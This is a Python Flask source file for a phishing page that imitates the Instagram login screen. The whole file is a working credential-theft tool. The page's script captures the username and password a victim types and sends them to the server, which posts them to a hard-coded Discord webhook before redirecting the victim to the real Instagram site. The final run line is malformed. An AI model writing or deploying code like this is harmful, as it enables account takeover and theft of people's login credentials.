from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

# Your Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1576100925183885395/1BSb5AqGSairin1gG3zfX1Rfks2jUO00uRnmy4MvIQIf9ywuwGntpFRYRjQ4FS4XOVAl"

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram Login</title>
        <style>
            body {
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            }
            .login-container {
                background-color: #ffffff;
                border: 1px solid #dbdbdb;
                padding: 40px;
                width: 350px;
                text-align: center;
            }
            h2 {
                color: #262626;
                margin-bottom: 20px;
            }
            input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                box-sizing: border-box;
            }
            button {
                width: 100%;
                padding: 10px;
                background-color: #0095f6;
                color: white;
                border: none;
                border-radius: 3px;
                cursor: pointer;
                font-weight: bold;
            }
            button:hover {
                background-color: #0081d6;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Instagram</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                // Send credentials to backend
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                }).then(() => {
                    // Redirect to real Instagram
                    window.location.href = 'https://www.instagram.com/';
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Send to Discord
    try:
        requests.post(WEBHOOK_URL, json={
            'content': f"🔓 New Login Attempt!\nUsername: `{username}`\nPassword: `{password}`"
        })
    except Exception as e:
        print(f"Error sending to Discord: {e}")
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run host='0.0.0.0', port=TOKEN